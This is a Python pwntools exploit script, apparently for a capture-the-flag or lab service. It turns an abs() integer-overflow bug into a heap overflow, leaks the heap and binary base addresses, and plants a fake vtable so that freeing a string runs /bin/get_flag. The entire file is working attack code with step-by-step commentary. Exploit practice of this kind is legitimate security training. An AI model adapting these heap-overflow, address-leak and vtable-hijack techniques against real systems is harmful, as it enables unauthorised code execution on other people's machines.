#!/usr/bin/python3

#import libraries
import sys
import time
from pathlib import Path
from ctypes import CDLL
from itertools import count
#get some pwn stuff into global namespace
from pwn import p64, sleep, remote, context
#disable annoying pwntools log messages (e.g. info regarding opened/closed connection)
context.log_level = 'error'

#set host and port to connect to
host = "hacky2"
port = 13727
if len(sys.argv) >= 2:
    host = sys.argv[1]
if len(sys.argv) >= 3:
    port = int(sys.argv[2])


verbose_mode = False


#This is where the exploit lives.
def exploit():
    proc = remote(host, port, fam="ipv4")

    str1 = b"AAAAAAA\n"
    print(f"(-) Adding String1 of size 8: {str1}")
    add(proc, 8, str1)

    str2 = b"BBBBBBB\n"
    print(f"(-) Adding String2 of size 8: {str2}")
    add(proc, 8, str2)

    str3 = b"CCCCCCC\n"
    print(f"(-) Adding String3 of size 8: {str3}")
    add(proc, 8, str3)

    str4 = b"CCCCCCC\n"
    print(f"(-) Adding String4 of size 8: {str4}")
    add(proc, 8, str4)

    print("(-) Freeing third String.")
    delete(proc, 3)

    print("(-) Adding another String using 0xFFFFFFFF (most negative integer) as size.")
    print("    This abuses the fact that abs() is not properly defined for this input.")
    print("    This allows us to overflow on the heap.")
    print("    The new String is be allocated in place of String1, which we just freed.")
    print("    We use this to write the chunk containing the data structure (not data!) of String4.")
    print("    Shifting pointer to data of String4 using single NULL byte overflow into its address.")
    print("    This then allows for the leak of pointers from the memory before the chunk.")
    add(proc, -2147483648, 0x100*b"C" + p64(0x00) + p64(0x21) + b"vptraddr" + b"\n")

    print("(-) Printing content of strings.")
    resp = show(proc)[3]
    heap_leak_raw = resp[0xd8:0xe0]
    addr_heap_base = int.from_bytes(heap_leak_raw, 'little') - 0x14200
    print(f"(-) Successfully retrieved heap base address: {addr_heap_base:#0{0}18x}")

    print("(-) Freeing chunk we just allocated.")
    delete(proc, 4)

    #write into chunkD again to leak heap
    addr_heap_chunkA_userdata = addr_heap_base + 0x12F20
    print("(-) Repeating modified overflow method into String4:")
    print(f"(-) Using full oerflow and crafted heap address ({addr_heap_chunkA_userdata:#0{0}18x}) of userdata of String1 data structure to leak vpointer.")
    add(proc, -2147483648, 0x100*b"C" + p64(0x00) + p64(0x21) + b"vptraddr" + p64(addr_heap_chunkA_userdata) + b"\n")

    print("(-) Printing content of strings.")
    resp = show(proc)[3]
    vuln_leak_raw = resp[0:8]
    addr_vuln_base = int.from_bytes(vuln_leak_raw, 'little') - 0x7c50
    print(f"(-) Successfully leaked base address of vuln binary in memory: {addr_vuln_base:#0{0}18x}")

    print("(-) Freeing chunk we just allocated.")
    delete(proc, 4)

    addr_vuln_typinfo_string = addr_vuln_base + 0x7c98
    addr_vuln_string_exec = addr_vuln_base + 0x2316
    addr_heap_strC = addr_heap_base + 0x141C0
    print("(-) Calculated Addresses:")
    print(f"    - typeinfo struct of string: {addr_vuln_typinfo_string:#0{0}18x}")
    print(f"    - exec function of string: {addr_vuln_string_exec:#0{0}18x}")
    print(f"    - address of String3 on heap: {addr_heap_strC:#0{0}18x}")

    fake_vatble = p64(0x0) + p64(addr_vuln_typinfo_string) + p64(addr_vuln_string_exec) + p64(addr_vuln_string_exec)
    print(f"(-) Creadted fake vtable with exec() in place of destructor:")
    print(f"    {fake_vatble}")

    str_bin_get_flag = b"/bin/get_flag"
    str_bin_get_flag_padded = str_bin_get_flag + (16 - (len(str_bin_get_flag)%16))*b"\x00"
    print(f"Crafted binary path string: {str_bin_get_flag_padded}")

    addr_heap_fake_vtable = addr_heap_strC + 16
    addr_heap_str_bin_get_flag = addr_heap_strC + len(fake_vatble)
    print("(-) Calculated Addresses:")
    print(f"    - fake vtable on heap: {addr_heap_fake_vtable:#0{0}18x}")
    print(f"    - binary path string on heap: {addr_heap_str_bin_get_flag:#0{0}18x}")

    content_heap_strC  = b""
    content_heap_strC += fake_vatble
    content_heap_strC += str_bin_get_flag_padded
    content_heap_strC += (0x100 - (len(fake_vatble) + len(str_bin_get_flag_padded))) * b"\x00"
    content_heap_strC += p64(0x0)
    content_heap_strC += p64(0x21)
    content_heap_strC += p64(addr_heap_fake_vtable)
    content_heap_strC += p64(addr_heap_str_bin_get_flag)
    content_heap_strC += p64(len(str_bin_get_flag) + 1)

    print("(-) Placing fake vtable within new string allocated in place of String3.")
    print("    Overflowing into String4 to:")
    print("    - point vtable to fake vtable on heap")
    print("    - point string to binary path string on heap.")
    add(proc, -2147483648, content_heap_strC + b"\n")

    print("(-) Freeing String we just allocated to trigger exec() via fke vtable entry of destructor.")
    flag = delete(proc, 3)

    if b"flag" in flag:
        print(f"(-) Successfully rerieved flag: {flag.decode()}")
    else:
        print("(-) Something went wrong retrieving the flag...")

    proc.close()
    return


def quit(target, verbose=verbose_mode):
    if verbose: print("quit")
    target.write(b"quit\n")

def show(target, verbose=verbose_mode):
    if verbose: print("show:")
    target.write(b"show\n")
    raw = []
    while True:
        line = target.readline()
        if b"ok" in line: break
        if verbose: print(line)
        raw.append(line)
    return raw

def add(target, n, raw, verbose=verbose_mode, newline_terminate_string=True):
    if verbose: print(f"add {n} bytes: {raw}")
    target.write(b"add\n")
    target.write(str(n).encode()+b"\n")
    target.write(raw+b"\n" if newline_terminate_string else raw)
    response = target.readuntil(b"\n")
    if verbose: print(response)

def edit(target, i, raw, verbose=verbose_mode, newline_terminate_string=True):
    if verbose: print(f"edit string at index {i}: {raw}")
    target.write(b"edit\n")
    target.write(str(i).encode()+b"\n")
    target.write(raw+b"\n" if newline_terminate_string else raw)
    response = target.readuntil(b"\n")
    if verbose: print(response)

def delete(target, i, verbose=verbose_mode):
    if verbose: print(f"\"delete\" string at index {i}")
    target.write(b"delete\n")
    target.write(str(i).encode()+b"\n")
    response = target.readuntil(b"\n")
    if verbose: print(response)
    return response


#Invoke the exploit when the script is executed.
exploit()


